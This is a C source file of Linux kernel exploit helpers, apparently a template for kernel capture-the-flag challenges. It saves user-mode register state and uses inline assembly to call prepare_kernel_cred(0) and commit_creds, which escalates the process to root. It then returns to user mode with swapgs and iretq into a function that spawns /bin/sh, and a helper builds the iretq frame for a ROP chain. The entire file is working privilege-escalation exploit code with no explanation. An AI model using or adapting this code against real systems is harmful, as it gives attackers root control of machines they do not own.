#include <unistd.h>

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

void save_state() {
  asm(".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;");
}

void shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
}

unsigned long prepare_kernel_cred;
unsigned long commit_creds;

void ret2user() {
  asm(".intel_syntax noprefix;"
      "mov rax, prepare_kernel_cred;"
      "xor rdi, rdi;"
      "call rax;"
      "mov rdi, rax;"
      "mov rax, commit_creds;"
      "call rax;"
      "swapgs;"
      "mov r15, user_ss;"
      "push r15;"
      "mov r15, user_sp;"
      "push r15;"
      "mov r15, user_rflags;"
      "push r15;"
      "mov r15, user_cs;"
      "push r15;"
      "mov r15, shell;"
      "push r15;"
      "iretq;"
      ".att_syntax;");
}

void rop_iretq(unsigned long *p) {
  *p++ = (unsigned long)&shell;
  *p++ = user_cs;
  *p++ = user_rflags;
  *p++ = user_sp;
  *p++ = user_ss;
}
